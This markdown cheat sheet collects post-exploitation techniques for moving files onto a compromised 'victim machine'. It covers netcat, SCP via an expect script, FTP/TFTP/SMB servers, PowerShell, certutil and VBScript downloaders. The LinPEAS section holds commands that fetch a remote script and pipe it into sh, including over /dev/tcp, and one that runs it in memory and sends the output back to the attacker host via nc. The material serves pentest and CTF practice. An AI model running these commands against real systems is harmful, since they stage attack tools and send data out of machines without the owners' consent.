# File Transfer

Resources to get what you need once in the victim machine


- <https://github.com/andrew-d/static-binaries>






## Paste bins
- <https://snips.sh/>










## Base 64 Encoding + Copy & Paste
We won't be actually transferring a file across a network, but instead we will be copy-pasting executable files from our attacking machine to the target. But how can we copy and paste executable files, which are full of unprintable characters?

The trick is by first encoding the file in Base 64.
We can do this by using Python:
```
python -c 'print(__import__("base64").b64encode(open("file", "rb").read()))'
```

Then, on the target, we can copy and paste the string into a `.txt` file with `echo "string" > output.txt`, and use base64 to decode the file, with `base64 -d output.txt > output-file`






## Encrypted & Secure File Transfer

### 1
Set up listener on the target:
```
ncat -nvlp port --ssl > out-file
```

And connect to the listener from the attacking machine:
```
ncat -nv target-ip port --ssl < file-to-send
```


### 2
The second method is to use the Secure Copy Protocol (SCP).

Start the SSH server easily on your Kali Linux with service ssh start.

On the target, we need to create a file, line by line, which will enter the SSH password in, and download the remote file.
The only reason that a one-liner doesn't work is because SCP prompts the user for a password, and simply echoing the password and piping it to the command won't work. The list of commands to build the file looks like this:
```
echo '#!/usr/bin/expect' > scp.exp
echo 'spawn scp username@ip-addr:/path-to-file out-file' >> scp.exp
echo 'set pass "password"' >> scp.exp
echo 'expect {' >> scp.exp
echo 'password: {send "$pass\r"; exp_continue}' >> scp.exp
echo '}' >> scp.exp
```

To run this file, use `expect scp.exp` and securely download the file you want.

You may need to create a new user for SSH to log into, if so, you can use the `adduser username` command and follow the prompt to set up a new user.














## HTTP

Serve files from attacker machine:
- HTTP: `python3 -m http.server [PORT]` Default port 8000








## FTP


Serve files:
- FTP: `python -m pyftpdlib [-p port]` Default port pyftpdlib uses is port 2121



Download:
On target machine, if the shell isn't interactive, create a file with all the FTP commands.

```
echo open ip-addr > ftp.txt
echo username >> ftp.txt
echo password >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
```

Then run `ftp -v -n -s:ftp.txt`




### TFTP
Serve:
```
atftpd --daemon --port 69 root-dir
```
(Uses UDP)


To download/upload a file, use `tftp -i ip-addr {GET | PUT} file`












## SMB

Serve:
```
python /usr/share/doc/python-impacket/examples/smbserver.py share-name root-dir
```



On the target, you can view the available shares on the SMB server with net view `\\ip-addr`.
To view the files available in the share, simply use dir `\\ip-addr\share-name`


To actually download a file, use `copy \\ip-addr\share-name\file out-file`




















## Linux


### wget
```
wget http://ip-addr[:port]/file [-o output-file]

wget ftp://ip-addr[:port]/file [-o output-file] # Doesn't support binaries
```


### curl
```
curl http://ip-addr[:port]/file [-o output-file]
```


### nc
```
{ echo -e "GET /[FILE NAME] HTTP/1.0\r\n"; sleep 1; } | nc -n [IP] [PORT] > [OUTPUT NAME] && sed -i '1,/^$/d' [OUTPUT NAME]
```







### LinEnum

- <https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>

```

LinEnum.sh -s -k keyword -r report -e /tmp/ -t

```







### LINPeas
```
# From github
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Without curl
python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"

python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"


# Use a linpeas binary
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64

# Output to file
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors






# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim


```





























## Windows

- <https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/>
- <https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65>


### PowerShell

Valid PowerShell cmdlets/methods that can be used to download files:
- Invoke-WebRequest
- Start-BitsTransfer
- system.Net.WebClient
- Invoke-RestMethod



- `Invoke-WebRequest` (In Powershell `curl` is an alias for this command)
```
# get a website content, save it as xx.html (iwr is alias of Invoke-WebRequest)
iwr "google.com" -outfile xx.html


$url = "http://192.168.1.10/example.txt"
$destination = "C:\Downloads\example.txt"
Invoke-WebRequest -Uri $url -OutFile $destination

# Download using PowerShellâ€™s WebClient object
(new-object System.Net.WebClient).DownloadFile('http://[IP]/file.txt','dest/path/file.txt')
```




```
powershell.exe -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")
```





```
# use single quotes!
powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')
```



### CMD
```
certutil -urlcache -f http://[IP]/[FILENAME] [DEST FILENAME]

```




### VBScript
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs 
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs 
echo Err.Clear >> wget.vbs 
echo Set http = Nothing >> wget.vbs 
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
echo http.Open "GET", strURL, False >> wget.vbs 
echo http.Send >> wget.vbs 
echo varByteArray = http.ResponseBody >> wget.vbs 
echo Set http = Nothing >> wget.vbs 
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs 
echo strData = "" >> wget.vbs 
echo strBuffer = "" >> wget.vbs 
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
echo Next >> wget.vbs 
echo ts.Close >> wget.vbs
```


Then run `cscript wget.vbs http://ip-addr:port/file output-file`

